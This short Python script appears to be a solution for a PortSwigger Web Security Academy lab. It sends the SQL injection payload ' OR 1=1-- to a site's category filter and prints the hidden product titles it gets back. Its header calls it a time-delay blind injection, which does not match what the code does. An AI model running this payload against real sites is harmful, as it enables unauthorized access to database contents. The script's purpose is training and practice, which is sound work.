# Web Security Academy Port Swigger
# Blind SQL injection with with Time Delays
#
import requests
import argparse
import re
from urllib.parse import quote_plus


parser = argparse.ArgumentParser()
parser.add_argument("url", help="URL to vulnerable site")
args = parser.parse_args()

pattern = re.compile(r'<h3>(.*)</h3>')

sqls = {
    "HiddenData":
        "/filter?category=' OR 1=1--"
}

session = requests.Session()
response = session.get(args.url + sqls["HiddenData"])


if response.status_code == 200:
    gifts = pattern.findall(response.text)
    print('\n'.join(gifts))
else:
    print('URL request failed')